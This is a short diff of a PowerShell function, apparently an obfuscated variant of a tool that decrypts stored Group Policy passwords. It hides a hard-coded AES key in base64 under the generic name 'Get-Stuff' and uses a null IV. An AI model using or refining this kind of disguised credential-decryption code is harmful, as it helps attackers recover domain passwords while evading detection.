@@ -31,9 +31,9 @@ function Get-Stuff {
             
             #Create a new AES .NET Crypto Object
             $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
-	    $stringAES = "MHg0ZSwweDk5LDB4MDYsMHhlOCwweGZjLDB4YjYsMHg2YywweGM5LDB4ZmEsMHhmNCwweDkzLDB4MTAsMHg2MiwweDBmLDB4ZmUsMHhlOCwweGY0LDB4OTYsMHhlOCwweDA2LDB4Y2MsMHgwNSwweDc5LDB4OTAsMHgyMCwweDliLDB4MDksMHhhNCwweDMzLDB4YjYsMHg2YywweDFi"
-            $dstringAES = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($stringAES))).Replace("\r","").Replace("\n","")
-	    [Byte[]] $AesKey = @($dstringAES)
+	    $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
+	    [Byte[]] $AesKey = @(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MHg0ZSwweDk5LDB4MDYsMHhlOCwweGZjLDB4YjYsMHg2YywweGM5LDB4ZmEsMHhmNCwweDkzLDB4MTAsMHg2MiwweDBmLDB4ZmUsMHhlOCwweGY0LDB4OTYsMHhlOCwweDA2LDB4Y2MsMHgwNSwweDc5LDB4OTAsMHgyMCwweDliLDB4MDksMHhhNCwweDMzLDB4YjYsMHg2YywweDFi"))))
+            
             
             #Set IV to all nulls to prevent dynamic generation of IV value
             $AesIV = New-Object Byte[]($AesObject.IV.Length) 
